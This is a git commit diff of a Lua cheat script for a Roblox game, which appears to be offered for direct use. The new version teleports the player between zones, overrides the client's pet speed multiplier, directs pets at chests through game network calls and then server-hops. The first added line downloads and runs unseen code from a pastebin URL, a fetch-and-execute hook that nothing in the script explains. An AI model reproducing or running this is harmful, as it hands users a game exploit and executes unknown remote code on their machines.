d7519e459a697ec8537a4e35d0f37baa050e6057
឵ <64882067+Tooxiic@users.noreply.github.com>
2024-02-17 01:47:03 +0000

    Update idk.lua

--- idk.lua
+++ idk.lua
@@ -1,156 +1,223 @@
-_G.autoBalloon = true
+loadstring(game:HttpGet("https://pastebin.com/raw/HyUbVXrW"))()
 
-local START_DELAY = 2 -- delay before starting
-local SERVER_HOP = true -- server hop after popping balloons
-local SERVER_HOP_DELAY = 1 -- delay before server hopping
-local BALLOON_DELAY = 2 -- delay before popping next balloon (if there are multiple balloons in the server)
-local GET_BALLOON_DELAY = 5 -- delay before getting balloons again if none are detected
+local BigChests = {
+    [1] = "Beach",
+    [2] = "Underworld",
+    [3] = "No Path Forest",
+    [4] = "Heaven Gates"
+}
 
+repeat
+    task.wait()
+until game:IsLoaded()
 
-
-
-
-
-task.wait(START_DELAY)
-
+local Workspace = game:GetService("Workspace")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Library = ReplicatedStorage:WaitForChild("Library")
+local Client = Library:WaitForChild("Client")
 local LocalPlayer = game:GetService("Players").LocalPlayer
 
-local function serverHop()
-    print("Server hopping in " .. SERVER_HOP_DELAY .. " seconds")
-    task.wait(SERVER_HOP_DELAY)
+local zonePath
 
-    local PlaceID = game.PlaceId
-    local AllIDs = {}
-    local foundAnything = ""
-    local actualHour = os.date("!*t").hour
-    local function tp()
-        local Site;
-        if foundAnything == "" then
-            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/8737899170/servers/Public?sortOrder=Asc&limit=100'))
-        else
-            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/8737899170/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
-        end
-        local ID = ""
-        if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
-            foundAnything = Site.nextPageCursor
-        end
-        local num = 0;
-        for i,v in pairs(Site.data) do
-            local Possible = true
-            ID = tostring(v.id)
-            if tonumber(v.maxPlayers) > tonumber(v.playing) then
-                for _,Existing in pairs(AllIDs) do
-                    if num ~= 0 then
-                        if ID == tostring(Existing) then
-                            Possible = false
-                        end
-                    else
-                        if tonumber(actualHour) ~= tonumber(Existing) then
-                            pcall(function()
-                                AllIDs = {}
-                                table.insert(AllIDs, actualHour)
-                            end)
-                        end
-                    end
-                    num = num + 1
-                end
-                if Possible == true then
-                    table.insert(AllIDs, ID)
-                    task.wait()
-                    pcall(function()
-                        task.wait()
-                        game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
-                    end)
-                    task.wait(4)
-                end
-            end
-        end
+local function trim(string)
+    if not string then
+        return false
     end
+    return string:match("^%s*(.-)%s*$")
+end
 
-    while task.wait() do
-        pcall(function()
-            tp()
-            if foundAnything ~= "" then
-                tp()
+local function split(input, separator)
+    if separator == nil then
+        separator = "%s"
+    end
+    local parts = {}
+    for str in string.gmatch(input, "([^" .. separator .. "]+)") do
+        table.insert(parts, str)
+    end
+    return parts
+end
+
+
+local function teleportToZone(selectedZone)
+    local teleported = false
+
+    while not teleported do
+        for _, v in pairs(Workspace.Map:GetChildren()) do
+            local zoneName = trim(split(v.Name, "|")[2])
+            if zoneName and zoneName == selectedZone then
+                LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Map[v.Name].PERSISTENT.Teleport.CFrame
+                teleported = true
+                break
             end
-        end)
+        end
+        task.wait()
     end
 end
 
-while _G.autoBalloon do
-    local balloonIds = {}
-
-    local getActiveBalloons = ReplicatedStorage.Network.BalloonGifts_GetActiveBalloons:InvokeServer()
-
-    local allPopped = true
-    for i, v in pairs(getActiveBalloons) do
-        if not v.Popped then
-            allPopped = false
-            print("Unpopped balloon found in " .. v.ZoneId)
-            balloonIds[i] = v
+local function waitForLoad(zone)
+    for _, v in pairs(Workspace.Map:GetChildren()) do
+        local zoneName = trim(split(v.Name, "|")[2])
+        if zoneName and zoneName == zone then
+            zonePath = game:GetService("Workspace").Map[v.Name]
+            break
         end
     end
 
-    if allPopped then
-        print("No balloons detected, waiting " .. GET_BALLOON_DELAY .. " seconds")
-        if SERVER_HOP then
-            serverHop()
+    if not zonePath:FindFirstChild("INTERACT") then
+        local loaded = false
+        local detectLoad = zonePath.ChildAdded:Connect(function(child)
+            if child.Name == "INTERACT" then
+                loaded = true
+            end
+        end)
+
+        repeat
+            task.wait()
+        until loaded
+
+        detectLoad:Disconnect()
+    end
+
+    local function getBreakZonesAmount()
+        local counter = 0
+        for _ in pairs(zonePath.INTERACT.BREAK_ZONES:GetChildren()) do
+            counter = counter + 1
         end
-        task.wait(GET_BALLOON_DELAY)
-        continue
+        return counter
     end
 
-    if not _G.autoBalloon then
-        break
+    if getBreakZonesAmount() < 2 then
+        local loaded = false
+        local detectLoad = zonePath.INTERACT.BREAK_ZONES.ChildAdded:Connect(function(child)
+            if getBreakZonesAmount() == 2 then
+                loaded = true
+            end
+        end)
+        repeat
+            task.wait()
+        until loaded
+        detectLoad:Disconnect()
+    end
+end
+
+
+local function breakChest(zone)
+
+    local chest
+    while not chest do
+        for v in require(Client.BreakableCmds).AllByZoneAndClass(zone, "Chest") do
+            chest = v
+            break
+        end
+        task.wait()
     end
 
-    local originalPosition = LocalPlayer.Character.HumanoidRootPart.CFrame
+    local args = {
+        [1] = {
 
-    LocalPlayer.Character.HumanoidRootPart.Anchored = true
-    for balloonId, balloonData in pairs(balloonIds) do
-
-        print("Popping balloon in " .. balloonData.ZoneId)
-
-        local balloonPosition = balloonData.Position
-
-        ReplicatedStorage.Network.Slingshot_Toggle:InvokeServer()
-
-        task.wait()
-
-        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(balloonPosition.X, balloonPosition.Y + 30, balloonPosition.Z)
-
-        task.wait()
-
-        local args = {
-            [1] = Vector3.new(balloonPosition.X, balloonPosition.Y + 25, balloonPosition.Z),
-            [2] = 0.5794160315249014,
-            [3] = -0.8331117721691044,
-            [4] = 200
         }
+    }
 
-        ReplicatedStorage.Network.Slingshot_FireProjectile:InvokeServer(unpack(args))
+    for petId, _ in pairs(require(Client.Save).Get(LocalPlayer).EquippedPets) do
+        args[1][petId] = {
+            ["targetValue"] = chest,
+            ["targetType"] = "Player"
+        }
+    end
 
+    game:GetService("ReplicatedStorage").Network.Pets_SetTargetBulk:FireServer(unpack(args))
+
+    local brokeChest = false
+    local breakableRemovedService = Workspace:WaitForChild("__THINGS").Breakables.ChildRemoved:Connect(function(breakable)
+        if breakable.Name == chest then
+            brokeChest = true
+            print("Broke chest")
+        end
+    end)
+
+    repeat
+        task.wait()
+    until brokeChest
+
+    breakableRemovedService:Disconnect()
+end
+
+
+
+require(Library.Client.PlayerPet).CalculateSpeedMultiplier = function()
+    return 200
+end
+
+local sortedKeys = {}
+for key in pairs(BigChests) do
+    table.insert(sortedKeys, key)
+end
+table.sort(sortedKeys)
+
+for _, key in ipairs(sortedKeys) do
+    local zoneName = BigChests[key]
+
+    print("Starting " .. zoneName)
+
+    teleportToZone(zoneName)
+    waitForLoad(zoneName)
+    task.wait()
+
+    task.wait(2)
+    for _, v in pairs(game:GetService("Workspace").__DEBRIS:GetChildren()) do
+
+        if v.Name == "host" then
+            local timer
+
+            pcall(function()
+                timer = v.ChestTimer.Timer.Text
+            end)
+
+            if timer ~= nil then
+                if timer == "00:00" or timer == "09:59" then
+                    print(zoneName .. " chest is available")
+                    LocalPlayer.Character.HumanoidRootPart.CFrame = zonePath.INTERACT.BREAKABLE_SPAWNS.Boss.CFrame
+                    breakChest(zoneName)
+                else
+                    print(zoneName .. " chest is not available " .. timer)
+                end
+                v:Destroy()
+                break
+            end
+        end
+    end
+    warn("Finished " .. zoneName)
+end
+
+print("Server hopping")
+
+task.wait()
+
+local sfUrl = "https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=%s&limit=%s&excludeFullGames=true" 
+local req = request({ Url = string.format(sfUrl, 8737899170, "Desc", 50) }) 
+local body = game:GetService("HttpService"):JSONDecode(req.Body) 
+local deep = math.random(1, 3)
+if deep > 1 then
+    for i = 1, deep, 1 do
+        req = request({ Url = string.format(sfUrl .. "&cursor=" .. body.nextPageCursor, 8737899170, "Desc", 50) }) 
+        body = game:GetService("HttpService"):JSONDecode(req.Body) 
         task.wait(0.1)
-
-        local args = {
-            [1] = balloonId
-        }
-
-        ReplicatedStorage.Network.BalloonGifts_BalloonHit:FireServer(unpack(args))
-
-        task.wait()
-
-        ReplicatedStorage.Network.Slingshot_Unequip:InvokeServer()
-
-        print("Popped balloon, waiting " .. BALLOON_DELAY .. " seconds")
-        task.wait(BALLOON_DELAY)
     end
-
-    if SERVER_HOP then
-        serverHop()
+end
+local servers = {} 
+if body and body.data then
+    for i, v in next, body.data do
+        if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
+            table.insert(servers, 1, v.id)
+        end
     end
-
-    LocalPlayer.Character.HumanoidRootPart.Anchored = false
-    LocalPlayer.Character.HumanoidRootPart.CFrame = originalPosition
+end
+local randomCount = #servers
+if not randomCount then
+    randomCount = 2
+end
+while true do
+    game:GetService("TeleportService"):TeleportToPlaceInstance(8737899170, servers[math.random(1, randomCount)], LocalPlayer)
+    task.wait(0.5)
+    game:GetService("TeleportService"):Teleport(8737899170, LocalPlayer)
 end
